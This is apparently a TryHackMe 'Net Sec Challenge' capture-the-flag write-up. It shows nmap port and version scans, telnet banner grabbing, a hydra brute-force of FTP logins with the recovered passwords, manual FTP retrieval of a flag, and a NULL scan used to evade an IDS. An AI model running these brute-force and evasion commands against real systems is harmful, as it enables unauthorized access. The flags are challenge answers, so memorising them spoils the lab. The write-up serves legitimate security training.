<p align="center">
  THM : Net Sec Challenge<br>
  Difficulty : Medium<br>
  Room link : https://tryhackme.com/room/netsecchallenge<br>
  <img src="https://i.imgur.com/2rJmKMA.jpg">
</p>

## Summary

- [What is the highest port number being open less than 10,000 ?](#what-is-the-highest-port-number-being-open-less-than-10000-)
- [There is an open port outside the common 1000 ports; it is above 10,000. What is it ?](#there-is-an-open-port-outside-the-common-1000-ports-it-is-above-10000-what-is-it-)
- [How many TCP ports are open ?](#how-many-tcp-ports-are-open-)
- [What is the flag hidden in the HTTP server header ?](#what-is-the-flag-hidden-in-the-http-server-header-)
- [What is the flag hidden in the SSH server header?](#what-is-the-flag-hidden-in-the-ssh-server-header-)
- [We have an FTP server listening on a nonstandard port. What is the version of the FTP server ?](#we-have-an-ftp-server-listening-on-a-nonstandard-port-what-is-the-version-of-the-ftp-server-)
- [We learned two usernames using social engineering: eddie and quinn. What is the flag hidden in one of these two account files and accessible via FTP ?](#we-learned-two-usernames-using-social-engineering-eddie-and-quinn-what-is-the-flag-hidden-in-one-of-these-two-account-files-and-accessible-via-ftp-)
- [Browsing to http://[IP]:8080 displays a small challenge that will give you a flag once you solve it. What is the flag ?](#browsing-to-httpip8080-displays-a-small-challenge-that-will-give-you-a-flag-once-you-solve-it-what-is-the-flag-)
- [Conclusion](#conclusion)

## What is the highest port number being open less than 10,000 ?

We can use nmap with `-p` option to answer this question :  
```
attacker@AttackBox:~$ nmap 10.10.9.119 -p 1-10000
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-08 13:40 CET
Nmap scan report for 10.10.9.119
Host is up (0.079s latency).
Not shown: 9995 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 5.67 seconds
```

The highest open port under port 10 000 is port 8080.

## There is an open port outside the common 1000 ports; it is above 10,000. What is it ?

Again, we can use nmap with `-p` option, but this time, we have to scan ports above 10 000 :  
```
attacker@AttackBox:~$ nmap 10.10.9.119 -p 10000-65535
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-08 13:43 CET
Nmap scan report for 10.10.9.119
Host is up (0.056s latency).
Not shown: 55535 closed ports
PORT      STATE SERVICE
10021/tcp open  unknown
```

The open port aboe 10 000 is port 10021.

## How many TCP ports are open ?

We found 5 open ports during our first scan, and a last open port when scanning ports above 10 000, so there is 6 open ports.

## What is the flag hidden in the HTTP server header ?

Now, we can use telnet to send a basic request (`GET /`) to the web server to get the HTTP header :  
```
attacker@AttackBox:~$ telnet 10.10.9.119 80
Trying 10.10.9.119...
Connected to 10.10.9.119.
Escape character is '^]'.
GET /

HTTP/1.0 400 Bad Request
Content-Type: text/html
Content-Length: 345
Connection: close
Date: Sun, 08 Jan 2023 14:07:27 GMT
Server: lighttpd THM{web_server_25352}

<?xml version="1.0" encoding="iso-8859-1"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
         "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
 <head>
  <title>400 Bad Request</title>
 </head>
 <body>
  <h1>400 Bad Request</h1>
 </body>
</html>
Connection closed by foreign host.
```

We have the flag in the Server header.

## What is the flag hidden in the SSH server header ?

Like for the previous question, we can use telnet to get the flag, but this time, we don't need to send any specific request. The SSH server will just send us 
the banner when we will connect to it :  
```
attacker@AttackBox:~$ telnet 10.10.9.119 22
Trying 10.10.9.119...
Connected to 10.10.9.119.
Escape character is '^]'.
SSH-2.0-OpenSSH_8.2p1 THM{946219583339}
```

## We have an FTP server listening on a nonstandard port. What is the version of the FTP server ?

It seems that the ftp server is running on port 10021. We can use nmap to get the service version bu using the `-sV` option :  
```
attacker@AttackBox:~$ nmap 10.10.9.119 -p 10021 -sV
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-08 15:11 CET
Nmap scan report for 10.10.9.119
Host is up (0.034s latency).

PORT      STATE SERVICE VERSION
10021/tcp open  ftp     vsftpd 3.0.3
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.51 seconds
```

The version of the FTP server is vsftpd 3.0.3.

## We learned two usernames using social engineering: eddie and quinn. What is the flag hidden in one of these two account files and accessible via FTP ?

The only thing to try here is to brute force those users using hydra. First, we can create a file containing the two usernames :  
```
attacker@AttackBox:~$ echo eddie > users.txt
attacker@AttackBox:~$ echo quinn >> users.txt
attacker@AttackBox:~$ cat users.txt 
eddie
quinn
```

Then, we can try to bruteforce those user's password on port 10021 :  
```
attacker@AttackBox:~$ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://10.10.9.119:10021
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-08 15:17:53
[DATA] max 16 tasks per 1 server, overall 16 tasks, 28688802 login tries (l:2/p:14344401), ~1793051 tries per task
[DATA] attacking ftp://10.10.9.119:10021/
[10021][ftp] host: 10.10.9.119   login: eddie   password: jordan
[10021][ftp] host: 10.10.9.119   login: quinn   password: andrea
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-08 15:18:17
```

We found two passwords. Now let's use telnet and try to connect with user eddie :  
```
attacker@AttackBox:~$ telnet 10.10.9.119 10021
Trying 10.10.9.119...
Connected to 10.10.9.119.
Escape character is '^]'.
220 (vsFTPd 3.0.3)
USER eddie
331 Please specify the password.
PASS jordan
230 Login successful.
```

Now, let's create a second channel for the data (FTP works with two channels, one for sending commands and the second for data transfert) :  
```
PASV
227 Entering Passive Mode (10,10,9,119,118,94).
```

Now, we have to establish a connection to another port for data transfert. To find out the correct port that was openned with PASV command, we have to take the two last
values (118 and 94), and calculate the port like so : (118 x 256) + 94 = 30 302.  
We can now connect to port 30 302 using telnet in another terminal :  
```
attacker@AttackBox:~$ telnet 10.10.9.119 30302
Trying 10.10.9.119...
Connected to 10.10.9.119.
Escape character is '^]'.
```

We are connected to the data channel. Now, we can type `LIST` in the first channel (where we typed USER and PASS commands), and the result should be received in the 
second channel :  
- Fist channel :  
```
LIST
150 Here comes the directory listing.
226 Directory send OK.
```

- Second channel :  
```
attacker@AttackBox:~$ telnet 10.10.9.119 30302
Trying 10.10.9.119...
Connected to 10.10.9.119.
Escape character is '^]'.
Connection closed by foreign host.
attacker@AttackBox:~$
```

There is no files in this account... Let's try with user quinn, it's the same method as before, we just use another set of credentials :  
```
attacker@AttackBox:~$ telnet 10.10.9.119 30638
Trying 10.10.9.119...
Connected to 10.10.9.119.
Escape character is '^]'.
-rw-rw-r--    1 1002     1002           18 Sep 20  2021 ftp_flag.txt
Connection closed by foreign host.
```

There is a file named ftp_flag.txt. Let's use the PASV command and create a second channel again, but this time, we will retrieve the content of the file we found :  
- First channel :  
```
attacker@AttackBox:~$ telnet 10.10.9.119 10021
Trying 10.10.9.119...
Connected to 10.10.9.119.
Escape character is '^]'.
220 (vsFTPd 3.0.3)
USER quinn
331 Please specify the password.
PASS andrea
230 Login successful.
PASV
227 Entering Passive Mode (10,10,9,119,117,185).
RETR ftp_flag.txt
150 Opening BINARY mode data connection for ftp_flag.txt (18 bytes).
226 Transfer complete.
```
- Second channel :  
```
attacker@AttackBox:~$ telnet 10.10.9.119 30137
Trying 10.10.9.119...
Connected to 10.10.9.119.
Escape character is '^]'.
THM{321452667098}
Connection closed by foreign host.
```

And we have the flag !

## Browsing to http://[IP]:8080 displays a small challenge that will give you a flag once you solve it. What is the flag ?

WARNING : It is recommanded to do this last question using the attack box from TryHackMe. If you have problems during this challenge, just try using the attack box 
from the website.  

Let's navigate to http://[IP]:8080/ :  
![](https://i.imgur.com/VB35YOn.jpg)  

There is a percentage of detection shown in this page. The goal is to run a port scan against the target without being detected by the IDS. We can simply try different 
scan types with the following options :  
- `-sS` : SYN <- DETECTED
- `-sT` : TCP Connect <- DETECTED
- `-sN` : NULL <- NOT DETECTED !

So the flag should appear on the web page when using `sudo nmap [IP] -p- -sN` :  
![](https://i.imgur.com/R28dLjT.jpg)  

## Conclusion

This room was very useful to practice basic nmap scan, brute force using hydra and also to learn basic requests of most used protocols. 
Thanks for this room and thanks for reading my write ups !
